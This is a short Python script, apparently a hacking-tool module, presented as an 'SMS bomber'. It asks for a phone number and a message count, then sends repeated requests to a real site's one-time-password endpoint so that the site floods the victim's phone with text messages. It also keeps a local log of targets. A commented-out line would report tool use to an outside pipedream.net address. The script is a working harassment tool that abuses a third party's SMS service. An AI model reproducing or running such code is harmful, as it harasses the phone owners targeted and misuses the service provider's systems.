import requests
from termcolor import colored
from time import sleep


def sms():
 #requests.get(f'https://eovzlu8cd49gpu1.m.pipedream.net/?tool=smsSpammer:{list55}')
 print(colored('''
++++++++++++++++++++++++++++++++++++++++++++++++++++++

======= ==   == =======
=       = = = = =
======= =  =  = =======
      = =     =       =
======= =     = =======
- Tool By m00nissmiling

[!] write phone number and message count ez usage 
++++++++++++++++++++++++++++++++++++++++++++++++++++++

''','red'))

 headers = {
    'Host': 'www.lystn.fm',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Sec-Ch-Ua-Platform': '""',
    'Accept-Language': 'EN',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://www.lystn.fm',
    'Sec-Fetch-Site': 'same-site',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://www.lystn.fm/mlogin-otpsend.php',
}
 
 in_ph=input("PHONE NUMBER [>]")
 full = f"%2B95{in_ph[1:]}"
 numb=int(input("MESSAGE COUNT [>]"))
 json_data = f"mobile={in_ph}&full_phone={full}"
 for i in range(0,numb):
  response = requests.post('https://www.lystn.fm/mlogin-otpvalidate.php', headers=headers, data=json_data,)

  if response.status_code==200:
   print(colored("[success]",'blue'))
  else: 
   print(colored("[fail]",'red'))
 log_file = open('log/log.txt','a')
 log_file.write(f'[sub] sms bomber --> phone {in_ph} --> message count {numb}\n')
 log_file.close()

sms()


